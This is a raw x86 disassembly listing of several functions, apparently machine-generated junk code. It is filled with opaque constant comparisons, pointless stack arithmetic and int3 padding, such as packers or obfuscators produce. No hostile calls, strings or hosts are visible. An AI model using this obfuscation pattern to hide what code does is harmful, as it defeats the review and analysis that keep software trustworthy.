  453018:	push   0xffffff98
  45301a:	push   ebx
  45301b:	push   0x2c221700
  453020:	call   0x45347c
  453025:	add    esp,0x10
  453028:	mov    ebx,DWORD PTR [ebp-0x30]
  45302b:	mov    edx,DWORD PTR [ebp-0x30]
  45302e:	push   eax
  45302f:	push   0x6e297300
  453034:	push   0xae5c1400
  453039:	push   0x34286f00
  45303e:	call   0x4539fb
  453043:	add    esp,0x10
  453046:	push   esi
  453047:	push   0xee3c7400
  45304c:	push   0xe08dda00
  453051:	push   ebx
  453052:	call   0x45347c
  453057:	add    esp,0x10
  45305a:	mov    eax,0xfcb75863
  45305f:	sub    DWORD PTR [ebp-0x30],eax
  453062:	add    eax,0x389b79d
  453067:	or     ebx,eax
  453069:	cmp    esi,DWORD PTR ds:0x4718a0
  45306f:	je     0x453090
  453071:	cmp    ebx,0x39
  453074:	je     0x453090
  453076:	sub    ebx,esi
  453078:	test   ebx,0x30
  45307e:	jne    0x453090
  453080:	test   esi,0x56
  453086:	jne    0x453090
  453088:	cmp    ebx,DWORD PTR [ebp-0x10]
  45308b:	je     0x453090
  45308d:	add    DWORD PTR [ebp-0x30],ebx
  453090:	mov    DWORD PTR [ebp-0x2c],eax
  453093:	call   0x45347c
  453098:	mov    edi,DWORD PTR [ebp-0x20]
  45309b:	sub    DWORD PTR [ebp-0x30],edi
  45309e:	push   0xffffffba
  4530a0:	push   esi
  4530a1:	push   0x34
  4530a3:	push   0x27
  4530a5:	push   0xb04ea600
  4530aa:	call   0x4536fd
  4530af:	add    esp,0x14
  4530b2:	mov    ecx,DWORD PTR [ebp-0x2c]
  4530b5:	cmp    ecx,esi
  4530b7:	jne    0x4530bc
  4530b9:	and    DWORD PTR [ebp-0x30],ecx
  4530bc:	mov    esi,DWORD PTR [ecx]
  4530be:	sub    DWORD PTR [ebp-0x30],ecx
  4530c1:	mov    ecx,DWORD PTR [ecx+0x4]
  4530c4:	add    ebx,ebx
  4530c6:	sub    ebx,eax
  4530c8:	add    ebx,edi
  4530ca:	mov    eax,DWORD PTR [ebp-0x30]
  4530cd:	mov    edx,DWORD PTR [ebp-0x30]
  4530d0:	sub    ebx,edx
  4530d2:	or     eax,ebx
  4530d4:	sub    eax,ebx
  4530d6:	sub    eax,esi
  4530d8:	test   eax,0x43
  4530dd:	je     0x4531ea
  4530e3:	mov    ebx,DWORD PTR [ebp-0x30]
  4530e6:	or     eax,esi
  4530e8:	cmp    eax,DWORD PTR [ebp-0x28]
  4530eb:	jne    0x4531ea
  4530f1:	sub    DWORD PTR [ebp-0x30],eax
  4530f4:	mov    edx,DWORD PTR ds:0x4718a0
  4530fa:	mov    eax,DWORD PTR ds:0x4718b8
  453100:	and    eax,edi
  453102:	sub    ebx,ecx
  453104:	add    DWORD PTR [ebp-0x30],eax
  453107:	or     edx,eax
  453109:	or     ebx,esi
  45310b:	add    ebx,edx
  45310d:	cmp    ebx,0x8bcf
  453113:	jne    0x4531ea
  453119:	sub    ebx,esi
  45311b:	test   ebx,0xc5
  453121:	je     0x4531ea
  453127:	xor    edx,edx
  453129:	add    edx,edx
  45312b:	mov    eax,DWORD PTR [ebp-0x30]
  45312e:	sub    DWORD PTR [ebp-0x30],eax
  453131:	add    DWORD PTR [ebp-0x30],edx
  453134:	sub    ebx,edx
  453136:	or     ebx,eax
  453138:	cmp    edi,ebx
  45313a:	jne    0x4531ea
  453140:	mov    eax,DWORD PTR [ebp-0x30]
  453143:	cmp    eax,DWORD PTR ds:0x4718b8
  453149:	jne    0x4531ea
  45314f:	sub    DWORD PTR [ebp-0x30],ebx
  453152:	mov    edx,0x33
  453157:	add    eax,ecx
  453159:	cmp    eax,DWORD PTR [ebp-0x10]
  45315c:	jne    0x4531ea
  453162:	cmp    eax,esi
  453164:	jne    0x4531ea
  45316a:	and    edx,esi
  45316c:	xor    ebx,ebx
  45316e:	test   edx,0x50
  453174:	jne    0x4531ea
  453176:	add    eax,eax
  453178:	cmp    edx,DWORD PTR ds:0x4718a0
  45317e:	jne    0x4531ea
  453180:	sub    DWORD PTR [ebp-0x30],eax
  453183:	mov    eax,ecx
  453185:	or     DWORD PTR [ebp-0x30],ebx
  453188:	and    eax,ebx
  45318a:	cmp    edx,DWORD PTR ds:0x4718a0
  453190:	jne    0x4531ea
  453192:	cmp    edx,DWORD PTR ds:0x4718b8
  453198:	jne    0x4531ea
  45319a:	add    DWORD PTR [ebp-0x30],esi
  45319d:	and    DWORD PTR [ebp-0x30],edx
  4531a0:	sub    eax,ebx
  4531a2:	mov    ebx,0x5f
  4531a7:	add    eax,eax
  4531a9:	sub    eax,ecx
  4531ab:	cmp    eax,0xfffffff4
  4531ae:	je     0x4531ea
  4531b0:	mov    ebx,DWORD PTR [ebp-0x30]
  4531b3:	and    eax,edi
  4531b5:	test   eax,0x1402
  4531ba:	jne    0x4531ea
  4531bc:	cmp    esi,DWORD PTR ds:0x4718b8
  4531c2:	je     0x4531ea
  4531c4:	add    eax,esi
  4531c6:	add    DWORD PTR [ebp-0x30],ebx
  4531c9:	add    eax,esi
  4531cb:	cmp    eax,DWORD PTR [ebp-0xc]
  4531ce:	je     0x4531ea
  4531d0:	mov    edx,DWORD PTR [ebp-0x30]
  4531d3:	cmp    eax,DWORD PTR [ebp-0x8]
  4531d6:	je     0x4531ea
  4531d8:	xor    ebx,ebx
  4531da:	and    eax,esi
  4531dc:	and    ebx,eax
  4531de:	sub    edx,edi
  4531e0:	add    edx,esi
  4531e2:	sub    DWORD PTR [ebp-0x30],edx
  4531e5:	or     ebx,ecx
  4531e7:	add    DWORD PTR [ebp-0x30],ebx
  4531ea:	or     esi,esi
  4531ec:	je     0x45322d
  4531ee:	mov    edx,edi
  4531f0:	mov    eax,0x28
  4531f5:	or     DWORD PTR [ebp-0x30],eax
  4531f8:	sub    DWORD PTR [ebp-0x30],ebx
  4531fb:	or     DWORD PTR [ebp-0x30],esi
  4531fe:	cmp    edx,0xffffff8f
  453201:	jne    0x453206
  453203:	add    DWORD PTR [ebp-0x30],edx
  453206:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  453208:	push   0x64
  45320a:	push   0x1c
  45320c:	call   0x45347c
  453211:	add    esp,0x8
  453214:	add    DWORD PTR [ebp-0x2c],0x8
  453218:	push   0x4013e400
  45321d:	push   0x4
  45321f:	push   ebx
  453220:	call   0x453f82
  453225:	add    esp,0xc
  453228:	jmp    0x45309b
  45322d:	push   0x24
  45322f:	push   edi
  453230:	push   0x37
  453232:	push   0x5d
  453234:	push   edi
  453235:	call   0x4539fb
  45323a:	add    esp,0x14
  45323d:	sub    DWORD PTR [ebp-0x30],eax
  453240:	mov    eax,DWORD PTR [ebp-0x20]
  453243:	mov    esi,DWORD PTR [ebp-0x30]
  453246:	mov    ebx,DWORD PTR [ebp-0x30]
  453249:	mov    DWORD PTR [ebp-0x30],esi
  45324c:	sub    DWORD PTR [ebp-0x30],eax
  45324f:	cmp    ebx,DWORD PTR ds:0x4718a0
  453255:	jne    0x453267
  453257:	mov    esi,0x99
  45325c:	mov    edi,DWORD PTR [ebp-0x30]
  45325f:	and    esi,edi
  453261:	and    DWORD PTR [ebp-0x30],esi
  453264:	mov    DWORD PTR [ebp-0x30],ebx
  453267:	mov    esi,DWORD PTR [ebp-0x30]
  45326a:	add    esi,esi
  45326c:	cmp    esi,0xffffffa8
  45326f:	jne    0x453314
  453275:	cmp    esi,eax
  453277:	je     0x453314
  45327d:	mov    edx,esi
  45327f:	sub    edx,ebx
  453281:	xor    edi,edi
  453283:	sub    edx,eax
  453285:	and    edi,edx
  453287:	cmp    eax,DWORD PTR ds:0x4718b8
  45328d:	jne    0x453314
  453293:	mov    ecx,DWORD PTR [ebp-0x30]
  453296:	mov    DWORD PTR [ebp-0x30],edi
  453299:	mov    edi,DWORD PTR ds:0x4718c0
  45329f:	sub    ecx,eax
  4532a1:	add    ecx,esi
  4532a3:	add    DWORD PTR [ebp-0x30],ecx
  4532a6:	test   ecx,0x86
  4532ac:	jne    0x453314
  4532ae:	sub    edi,esi
  4532b0:	mov    edx,DWORD PTR [ebp-0x30]
  4532b3:	mov    ecx,DWORD PTR ds:0x4718a0
  4532b9:	add    DWORD PTR [ebp-0x30],ecx
  4532bc:	add    edi,ecx
  4532be:	add    edx,esi
  4532c0:	cmp    edx,0x280d
  4532c6:	je     0x453314
  4532c8:	mov    ecx,DWORD PTR ds:0x4718c4
  4532ce:	mov    esi,DWORD PTR [ebp-0x30]
  4532d1:	add    edx,ecx
  4532d3:	cmp    edi,0xffffffd4
  4532d6:	je     0x453314
  4532d8:	sub    DWORD PTR [ebp-0x30],edx
  4532db:	mov    edx,DWORD PTR ds:0x4718c0
  4532e1:	mov    ecx,0x23
  4532e6:	cmp    esi,edi
  4532e8:	je     0x453314
  4532ea:	add    DWORD PTR [ebp-0x30],edi
  4532ed:	mov    edi,DWORD PTR ds:0x4718c4
  4532f3:	mov    ebx,DWORD PTR [ebp-0x30]
  4532f6:	sub    ebx,edx
  4532f8:	sub    ecx,eax
  4532fa:	add    DWORD PTR [ebp-0x30],ebx
  4532fd:	sub    DWORD PTR [ebp-0x30],ecx
  453300:	cmp    esi,DWORD PTR [ebp-0x28]
  453303:	je     0x453314
  453305:	cmp    ecx,edx
  453307:	je     0x453314
  453309:	sub    edi,ebx
  45330b:	sub    DWORD PTR [ebp-0x30],eax
  45330e:	add    DWORD PTR [ebp-0x30],edi
  453311:	xor    DWORD PTR [ebp-0x30],esi
  453314:	pop    edi
  453315:	add    ebx,esi
  453317:	cmp    edi,DWORD PTR ds:0x4718b8
  45331d:	jne    0x45334e
  45331f:	mov    ecx,edi
  453321:	sub    ecx,esi
  453323:	cmp    ebx,ecx
  453325:	je     0x45334e
  453327:	cmp    ecx,DWORD PTR [ebp-0x18]
  45332a:	je     0x45334e
  45332c:	add    DWORD PTR [ebp-0x30],ecx
  45332f:	cmp    ebx,0xffffffdd
  453332:	jne    0x45334e
  453334:	or     ebx,edi
  453336:	cmp    ebx,0x51
  453339:	jne    0x45334e
  45333b:	mov    esi,0xa911
  453340:	add    DWORD PTR [ebp-0x30],ebx
  453343:	mov    ebx,0xcd
  453348:	sub    DWORD PTR [ebp-0x30],esi
  45334b:	or     DWORD PTR [ebp-0x30],ebx
  45334e:	pop    esi
  45334f:	add    edx,ebx
  453351:	mov    ebx,DWORD PTR [ebp-0x30]
  453354:	cmp    ecx,eax
  453356:	je     0x453434
  45335c:	cmp    ebx,0x20eb
  453362:	je     0x453434
  453368:	or     DWORD PTR [ebp-0x30],edi
  45336b:	mov    ecx,DWORD PTR ds:0x4718b8
  453371:	add    DWORD PTR [ebp-0x30],edx
  453374:	add    ecx,eax
  453376:	add    DWORD PTR [ebp-0x30],edx
  453379:	cmp    esi,0x5f
  45337c:	jne    0x453434
  453382:	and    DWORD PTR [ebp-0x30],ecx
  453385:	sub    ebx,edx
  453387:	mov    ecx,DWORD PTR [ebp-0x30]
  45338a:	add    ebx,eax
  45338c:	cmp    ebx,DWORD PTR [ebp-0x18]
  45338f:	je     0x453434
  453395:	cmp    esi,DWORD PTR [ebp-0xc]
  453398:	je     0x453434
  45339e:	add    ebx,eax
  4533a0:	mov    edx,DWORD PTR [ebp-0x30]
  4533a3:	cmp    edx,eax
  4533a5:	jne    0x453434
  4533ab:	cmp    esi,edi
  4533ad:	jne    0x453434
  4533b3:	sub    DWORD PTR [ebp-0x30],ecx
  4533b6:	mov    ecx,DWORD PTR [ebp-0x30]
  4533b9:	and    edx,ecx
  4533bb:	mov    ecx,DWORD PTR [ebp-0x30]
  4533be:	add    DWORD PTR [ebp-0x30],ebx
  4533c1:	cmp    ecx,esi
  4533c3:	jne    0x453434
  4533c5:	or     DWORD PTR [ebp-0x30],esi
  4533c8:	mov    ebx,DWORD PTR [ebp-0x30]
  4533cb:	cmp    eax,DWORD PTR ds:0x4718c0
  4533d1:	jne    0x453434
  4533d3:	sub    DWORD PTR [ebp-0x30],edx
  4533d6:	mov    edx,DWORD PTR [ebp-0x30]
  4533d9:	test   ecx,0x2a8e
  4533df:	je     0x453434
  4533e1:	test   edi,0xfd
  4533e7:	jne    0x453434
  4533e9:	and    DWORD PTR [ebp-0x30],eax
  4533ec:	cmp    esi,DWORD PTR ds:0x4718a0
  4533f2:	jne    0x453434
  4533f4:	add    DWORD PTR [ebp-0x30],edx
  4533f7:	and    ecx,esi
  4533f9:	mov    DWORD PTR [ebp-0x30],ebx
  4533fc:	mov    ebx,DWORD PTR ds:0x4718b8
  453402:	mov    edx,ecx
  453404:	sub    DWORD PTR [ebp-0x30],edx
  453407:	cmp    ecx,DWORD PTR ds:0x4718c0
  45340d:	je     0x453434
  45340f:	sub    ebx,eax
  453411:	cmp    ebx,esi
  453413:	jne    0x453434
  453415:	mov    edx,DWORD PTR [ebp-0x30]
  453418:	mov    ecx,DWORD PTR [ebp-0x30]
  45341b:	add    edx,edx
  45341d:	xor    DWORD PTR [ebp-0x30],ecx
  453420:	sub    DWORD PTR [ebp-0x30],edx
  453423:	sub    ebx,edi
  453425:	test   ebx,0x464d
  45342b:	je     0x453434
  45342d:	cmp    ebx,eax
  45342f:	je     0x453434
  453431:	sub    DWORD PTR [ebp-0x30],ebx
  453434:	pop    ebx
  453435:	mov    ecx,DWORD PTR [ebp-0x30]
  453438:	mov    edx,DWORD PTR ds:0x4718a0
  45343e:	cmp    ecx,DWORD PTR [ebp-0x8]
  453441:	je     0x453475
  453443:	cmp    ecx,DWORD PTR [ebp-0x14]
  453446:	je     0x453475
  453448:	cmp    ebx,0x18128010
  45344e:	je     0x453475
  453450:	cmp    ecx,DWORD PTR ds:0x4718b8
  453456:	jne    0x453475
  453458:	add    DWORD PTR [ebp-0x30],edi
  45345b:	cmp    esi,eax
  45345d:	jne    0x453475
  45345f:	sub    edx,ecx
  453461:	sub    DWORD PTR [ebp-0x30],ebx
  453464:	sub    edx,ecx
  453466:	sub    edx,ecx
  453468:	sub    edx,ebx
  45346a:	cmp    ecx,DWORD PTR ds:0x4718c4
  453470:	jne    0x453475
  453472:	sub    DWORD PTR [ebp-0x30],edx
  453475:	leave  
  453476:	ret    
  453477:	int3   
  453478:	int3   
  453479:	int3   
  45347a:	int3   
  45347b:	int3   
  45347c:	push   ebp
  45347d:	mov    ebp,esp
  45347f:	sub    esp,0x18
  453482:	mov    ecx,0xfd
  453487:	add    ecx,ecx
  453489:	mov    edx,0xf2af
  45348e:	sub    edx,ecx
  453490:	mov    DWORD PTR [ebp-0x18],edx
  453493:	push   ebx
  453494:	mov    ecx,DWORD PTR [ebp-0x18]
  453497:	sub    ecx,edx
  453499:	add    DWORD PTR [ebp-0x18],ecx
  45349c:	push   esi
  45349d:	add    DWORD PTR [ebp-0x18],ecx
  4534a0:	push   edi
  4534a1:	mov    eax,DWORD PTR [ebp-0x18]
  4534a4:	add    eax,ecx
  4534a6:	add    DWORD PTR [ebp-0x18],eax
  4534a9:	mov    ecx,DWORD PTR [ebp-0x18]
  4534ac:	mov    eax,edx
  4534ae:	or     ecx,edx
  4534b0:	add    ecx,ecx
  4534b2:	sub    eax,ecx
  4534b4:	and    eax,edx
  4534b6:	sub    eax,edx
  4534b8:	sub    eax,edx
  4534ba:	cmp    ecx,DWORD PTR [ebp-0x8]
  4534bd:	jne    0x4534db
  4534bf:	mov    ecx,DWORD PTR [ebp-0x18]
  4534c2:	sub    ecx,eax
  4534c4:	mov    edi,DWORD PTR [ebp-0x18]
  4534c7:	add    ecx,eax
  4534c9:	cmp    ecx,0x79
  4534cc:	je     0x4534db
  4534ce:	mov    eax,edi
  4534d0:	add    DWORD PTR [ebp-0x18],eax
  4534d3:	cmp    ecx,0xc
  4534d6:	je     0x4534db
  4534d8:	sub    DWORD PTR [ebp-0x18],ecx
  4534db:	sub    eax,ecx
  4534dd:	sub    DWORD PTR [ebp-0x18],eax
  4534e0:	cmp    edi,0x21
  4534e3:	je     0x453530
  4534e5:	sub    edx,eax
  4534e7:	xor    ebx,ebx
  4534e9:	mov    ecx,DWORD PTR [ebp-0x18]
  4534ec:	cmp    edx,0x37
  4534ef:	je     0x453530
  4534f1:	cmp    edx,DWORD PTR [ebp-0x10]
  4534f4:	je     0x453530
  4534f6:	cmp    edi,DWORD PTR [ebp-0x18]
  4534f9:	je     0x453530
  4534fb:	sub    edx,eax
  4534fd:	mov    edi,0xa0400860
  453502:	mov    esi,0xf6
  453507:	xor    DWORD PTR [ebp-0x18],edx
  45350a:	sub    DWORD PTR [ebp-0x18],edi
  45350d:	cmp    ecx,0x7a
  453510:	jne    0x453530
  453512:	mov    edi,DWORD PTR [ebp-0x18]
  453515:	and    ecx,edx
  453517:	sub    edi,ebx
  453519:	mov    edx,ebx
  45351b:	add    DWORD PTR [ebp-0x18],esi
  45351e:	sub    edx,ebx
  453520:	add    DWORD PTR [ebp-0x18],edi
  453523:	and    DWORD PTR [ebp-0x18],ecx
  453526:	add    edx,esi
  453528:	and    DWORD PTR [ebp-0x18],esi
  45352b:	add    edx,ebx
  45352d:	add    DWORD PTR [ebp-0x18],edx
  453530:	mov    edx,DWORD PTR [ebp-0x18]
  453533:	mov    ebx,DWORD PTR [ebp-0x18]
  453536:	and    ebx,esi
  453538:	sub    DWORD PTR [ebp-0x18],edi
  45353b:	or     DWORD PTR [ebp-0x18],edx
  45353e:	sub    ebx,esi
  453540:	add    ebx,eax
  453542:	add    ebx,eax
  453544:	add    DWORD PTR [ebp-0x18],ebx
  453547:	cmp    ebx,edx
  453549:	je     0x45355e
  45354b:	cmp    ecx,0x39
  45354e:	je     0x45355e
  453550:	sub    ecx,eax
  453552:	mov    esi,edi
  453554:	xor    ebx,ebx
  453556:	or     DWORD PTR [ebp-0x18],ebx
  453559:	sub    esi,ecx
  45355b:	sub    DWORD PTR [ebp-0x18],esi
  45355e:	pop    edi
  45355f:	cmp    edi,DWORD PTR [ebp-0x14]
  453562:	je     0x45357a
  453564:	mov    eax,DWORD PTR ds:0x4718a4
  45356a:	add    eax,edx
  45356c:	mov    esi,DWORD PTR [ebp-0x18]
  45356f:	sub    DWORD PTR [ebp-0x18],eax
  453572:	or     esi,ecx
  453574:	sub    DWORD PTR [ebp-0x18],ecx
  453577:	add    DWORD PTR [ebp-0x18],esi
  45357a:	pop    esi
  45357b:	cmp    esi,0xc804098
  453581:	jne    0x4536df
  453587:	cmp    esi,DWORD PTR [ebp-0xc]
  45358a:	je     0x4536df
  453590:	mov    ecx,0x8f
  453595:	cmp    esi,DWORD PTR ds:0x4718a4
  45359b:	je     0x4536df
  4535a1:	cmp    esi,0x39
  4535a4:	jne    0x4536df
  4535aa:	mov    edx,DWORD PTR [ebp-0x18]
  4535ad:	sub    ecx,ebx
  4535af:	cmp    esi,edx
  4535b1:	je     0x4536df
  4535b7:	mov    eax,ecx
  4535b9:	mov    ebx,0xd0
  4535be:	add    DWORD PTR [ebp-0x18],esi
  4535c1:	sub    edx,esi
  4535c3:	sub    DWORD PTR [ebp-0x18],ebx
  4535c6:	add    edx,esi
  4535c8:	or     eax,esi
  4535ca:	cmp    eax,esi
  4535cc:	je     0x4536df
  4535d2:	cmp    eax,DWORD PTR [ebp-0x8]
  4535d5:	je     0x4536df
  4535db:	mov    ebx,0x3030
  4535e0:	mov    ecx,DWORD PTR [ebp-0x18]
  4535e3:	add    edx,ebx
  4535e5:	cmp    edx,ebx
  4535e7:	jne    0x4536df
  4535ed:	cmp    eax,DWORD PTR [ebp-0x14]
  4535f0:	je     0x4536df
  4535f6:	mov    ebx,DWORD PTR [ebp-0x18]
  4535f9:	cmp    eax,edx
  4535fb:	jne    0x4536df
  453601:	cmp    edx,DWORD PTR ds:0x4718a4
  453607:	jne    0x4536df
  45360d:	and    DWORD PTR [ebp-0x18],eax
  453610:	and    ebx,edi
  453612:	cmp    ecx,0xfffffffc
  453615:	jne    0x4536df
  45361b:	sub    edx,esi
  45361d:	mov    eax,DWORD PTR ds:0x4718a8
  453623:	add    ebx,esi
  453625:	cmp    ebx,0x24
  453628:	jne    0x4536df
  45362e:	sub    DWORD PTR [ebp-0x18],edx
  453631:	cmp    edx,DWORD PTR [ebp-0x8]
  453634:	jne    0x4536df
  45363a:	add    ecx,edx
  45363c:	mov    edx,DWORD PTR [ebp-0x18]
  45363f:	sub    DWORD PTR [ebp-0x18],edx
  453642:	and    eax,esi
  453644:	mov    edx,DWORD PTR ds:0x4718a4
  45364a:	cmp    ecx,DWORD PTR ds:0x4718a4
  453650:	je     0x4536df
  453656:	sub    DWORD PTR [ebp-0x18],ecx
  453659:	and    eax,esi
  45365b:	mov    ecx,DWORD PTR [ebp-0x18]
  45365e:	mov    edx,DWORD PTR [ebp-0x18]
  453661:	and    DWORD PTR [ebp-0x18],ebx
  453664:	sub    eax,ecx
  453666:	cmp    ecx,0xad1d
  45366c:	jne    0x4536df
  45366e:	mov    ebx,DWORD PTR [ebp-0x18]
  453671:	and    DWORD PTR [ebp-0x18],esi
  453674:	xor    ecx,ecx
  453676:	and    eax,ecx
  453678:	sub    DWORD PTR [ebp-0x18],ebx
  45367b:	sub    edx,edi
  45367d:	add    DWORD PTR [ebp-0x18],eax
  453680:	test   edx,0x8e
  453686:	jne    0x4536df
  453688:	cmp    edx,DWORD PTR [ebp-0x18]
  45368b:	jne    0x4536df
  45368d:	mov    eax,DWORD PTR [ebp-0x18]
  453690:	xor    ecx,ecx
  453692:	mov    DWORD PTR [ebp-0x18],edi
  453695:	add    DWORD PTR [ebp-0x18],edx
  453698:	xor    DWORD PTR [ebp-0x18],esi
  45369b:	sub    eax,edi
  45369d:	sub    DWORD PTR [ebp-0x18],ecx
  4536a0:	cmp    ebx,0x9a2d
  4536a6:	je     0x4536df
  4536a8:	sub    eax,edx
  4536aa:	add    eax,eax
  4536ac:	sub    eax,edi
  4536ae:	sub    eax,esi
  4536b0:	mov    edx,DWORD PTR [ebp-0x18]
  4536b3:	or     DWORD PTR [ebp-0x18],eax
  4536b6:	cmp    edx,0x67
  4536b9:	jne    0x4536df
  4536bb:	mov    ecx,DWORD PTR [ebp-0x18]
  4536be:	mov    ebx,DWORD PTR ds:0x4718a4
  4536c4:	and    DWORD PTR [ebp-0x18],edx
  4536c7:	cmp    ecx,0xecda
  4536cd:	jne    0x4536d4
  4536cf:	sub    ecx,esi
  4536d1:	add    DWORD PTR [ebp-0x18],ecx
  4536d4:	add    ebx,esi
  4536d6:	and    ebx,eax
  4536d8:	add    ebx,eax
  4536da:	and    ebx,esi
  4536dc:	sub    DWORD PTR [ebp-0x18],ebx
  4536df:	pop    ebx
  4536e0:	test   ebx,0xd5
  4536e6:	je     0x4536f6
  4536e8:	mov    eax,DWORD PTR [ebp-0x18]
  4536eb:	mov    ecx,DWORD PTR [ebp-0x18]
  4536ee:	add    eax,ecx
  4536f0:	add    DWORD PTR [ebp-0x18],ebx
  4536f3:	sub    DWORD PTR [ebp-0x18],eax
  4536f6:	leave  
  4536f7:	ret    
  4536f8:	int3   
  4536f9:	int3   
  4536fa:	int3   
  4536fb:	int3   
  4536fc:	int3   
  4536fd:	push   ebp
  4536fe:	mov    ebp,esp
  453700:	sub    esp,0x2c
  453703:	mov    edx,0xfa07
  453708:	mov    eax,0x41
  45370d:	sub    edx,eax
  45370f:	mov    DWORD PTR [ebp-0x24],edx
  453712:	push   ebx
  453713:	xor    eax,eax
  453715:	sub    DWORD PTR [ebp-0x24],eax
  453718:	push   esi
  453719:	xor    ebx,ebx
  45371b:	sub    DWORD PTR [ebp-0x24],ebx
  45371e:	push   edi
  45371f:	mov    ebx,DWORD PTR [ebp-0x24]
  453722:	cmp    ebx,DWORD PTR [ebp-0x1c]
  453725:	je     0x453741
  453727:	sub    ebx,edx
  453729:	or     DWORD PTR [ebp-0x24],edx
  45372c:	cmp    ebx,0xd0bf
  453732:	je     0x453741
  453734:	mov    eax,DWORD PTR [ebp-0x24]
  453737:	mov    edi,ebx
  453739:	add    DWORD PTR [ebp-0x24],eax
  45373c:	and    edi,eax
  45373e:	add    DWORD PTR [ebp-0x24],edi
  453741:	add    DWORD PTR [ebp-0x24],edi
  453744:	mov    edx,ebx
  453746:	sub    DWORD PTR [ebp-0x24],edx
  453749:	mov    DWORD PTR [ebp-0x24],edx
  45374c:	mov    edx,0xdc
  453751:	or     DWORD PTR [ebp-0x24],edi
  453754:	sub    edx,ebx
  453756:	mov    ebx,0xa217
  45375b:	add    ebx,edi
  45375d:	add    DWORD PTR [ebp-0x24],ebx
  453760:	test   ebx,0x8e
  453766:	jne    0x45378b
  453768:	cmp    edx,0x0
  45376b:	je     0x45378b
  45376d:	cmp    edi,ebx
  45376f:	je     0x45378b
  453771:	cmp    edx,0x45
  453774:	je     0x45378b
  453776:	xor    eax,eax
  453778:	mov    ecx,DWORD PTR [ebp-0x24]
  45377b:	sub    edx,ebx
  45377d:	cmp    ecx,0xffffffa7
  453780:	je     0x45378b
  453782:	add    DWORD PTR [ebp-0x24],eax
  453785:	sub    DWORD PTR [ebp-0x24],ecx
  453788:	sub    DWORD PTR [ebp-0x24],edx
  45378b:	sub    edx,edi
  45378d:	cmp    edx,ecx
  45378f:	jne    0x453953
  453795:	and    edx,ebx
  453797:	add    edx,edx
  453799:	xor    ebx,ebx
  45379b:	or     DWORD PTR [ebp-0x24],eax
  45379e:	mov    ecx,DWORD PTR [ebp-0x24]
  4537a1:	sub    ebx,edi
  4537a3:	cmp    ecx,eax
  4537a5:	je     0x453953
  4537ab:	xor    esi,esi
  4537ad:	mov    eax,DWORD PTR [ebp-0x24]
  4537b0:	sub    esi,edi
  4537b2:	cmp    esi,0xffffffb4
  4537b5:	je     0x453953
  4537bb:	mov    edi,DWORD PTR [ebp-0x24]
  4537be:	cmp    edx,0x46
  4537c1:	jne    0x453953
  4537c7:	cmp    edi,0xffffffd5
  4537ca:	je     0x453953
  4537d0:	add    DWORD PTR [ebp-0x24],eax
  4537d3:	sub    DWORD PTR [ebp-0x24],esi
  4537d6:	add    DWORD PTR [ebp-0x24],edi
  4537d9:	mov    edi,DWORD PTR [ebp-0x24]
  4537dc:	mov    esi,0xae
  4537e1:	cmp    ebx,DWORD PTR [ebp-0x18]
  4537e4:	je     0x453953
  4537ea:	mov    eax,DWORD PTR [ebp-0x24]
  4537ed:	sub    ecx,eax
  4537ef:	sub    DWORD PTR [ebp-0x24],esi
  4537f2:	add    DWORD PTR [ebp-0x24],ebx
  4537f5:	cmp    edx,0x3336
  4537fb:	je     0x453953
  453801:	mov    ebx,DWORD PTR [ebp-0x24]
  453804:	or     DWORD PTR [ebp-0x24],edi
  453807:	cmp    ebx,esi
  453809:	jne    0x453953
  45380f:	test   ecx,0xd553
  453815:	je     0x453953
  45381b:	cmp    ebx,eax
  45381d:	jne    0x453953
  453823:	sub    edx,esi
  453825:	xor    eax,eax
  453827:	mov    edi,DWORD PTR [ebp-0x24]
  45382a:	add    DWORD PTR [ebp-0x24],edx
  45382d:	sub    eax,esi
  45382f:	add    edi,ecx
  453831:	cmp    ebx,0x78f5
  453837:	je     0x453953
  45383d:	add    DWORD PTR [ebp-0x24],edi
  453840:	mov    edx,DWORD PTR [ebp-0x24]
  453843:	mov    ecx,DWORD PTR [ebp-0x24]
  453846:	add    ebx,ecx
  453848:	or     eax,edi
  45384a:	sub    DWORD PTR [ebp-0x24],edi
  45384d:	test   ebx,0x5e
  453853:	jne    0x453953
  453859:	mov    esi,DWORD PTR [ebp-0x24]
  45385c:	and    edx,edi
  45385e:	mov    edi,eax
  453860:	sub    DWORD PTR [ebp-0x24],ebx
  453863:	and    esi,edi
  453865:	cmp    esi,0xffffffd8
  453868:	jne    0x453953
  45386e:	mov    ebx,DWORD PTR [ebp-0x24]
  453871:	test   ebx,0x42
  453877:	je     0x453953
  45387d:	add    ebx,edi
  45387f:	sub    DWORD PTR [ebp-0x24],edx
  453882:	test   esi,0x24
  453888:	jne    0x453953
  45388e:	sub    ebx,ecx
  453890:	mov    edi,DWORD PTR [ebp-0x24]
  453893:	xor    ecx,ecx
  453895:	cmp    ebx,DWORD PTR [ebp-0x18]
  453898:	je     0x453953
  45389e:	xor    eax,eax
  4538a0:	mov    edx,DWORD PTR [ebp-0x24]
  4538a3:	sub    DWORD PTR [ebp-0x24],esi
  4538a6:	add    edi,edi
  4538a8:	cmp    edx,DWORD PTR [ebp-0x4]
  4538ab:	je     0x453953
  4538b1:	mov    esi,DWORD PTR [ebp-0x24]
  4538b4:	and    edx,ecx
  4538b6:	and    eax,ebx
  4538b8:	mov    ecx,0xd0
  4538bd:	sub    edi,ebx
  4538bf:	sub    DWORD PTR [ebp-0x24],ebx
  4538c2:	test   esi,0x48dd
  4538c8:	jne    0x453953
  4538ce:	add    edi,edx
  4538d0:	mov    ebx,edx
  4538d2:	mov    edx,DWORD PTR [ebp-0x24]
  4538d5:	sub    edx,ecx
  4538d7:	and    DWORD PTR [ebp-0x24],edx
  4538da:	sub    DWORD PTR [ebp-0x24],edi
  4538dd:	cmp    edi,esi
  4538df:	jne    0x453953
  4538e1:	mov    edx,DWORD PTR [ebp-0x24]
  4538e4:	add    DWORD PTR [ebp-0x24],esi
  4538e7:	sub    edx,edi
  4538e9:	add    eax,ecx
  4538eb:	sub    ebx,esi
  4538ed:	mov    edi,DWORD PTR [ebp-0x24]
  4538f0:	cmp    eax,0x35
  4538f3:	je     0x453953
  4538f5:	mov    esi,DWORD PTR [ebp-0x24]
  4538f8:	mov    ecx,0xe
  4538fd:	add    edi,eax
  4538ff:	add    DWORD PTR [ebp-0x24],edi
  453902:	sub    esi,ebx
  453904:	add    esi,esi
  453906:	cmp    esi,DWORD PTR [ebp-0x10]
  453909:	jne    0x453953
  45390b:	cmp    edx,0xffffffca
  45390e:	je     0x453953
  453910:	cmp    edx,0xfffffffc
  453913:	je     0x453953
  453915:	sub    esi,ecx
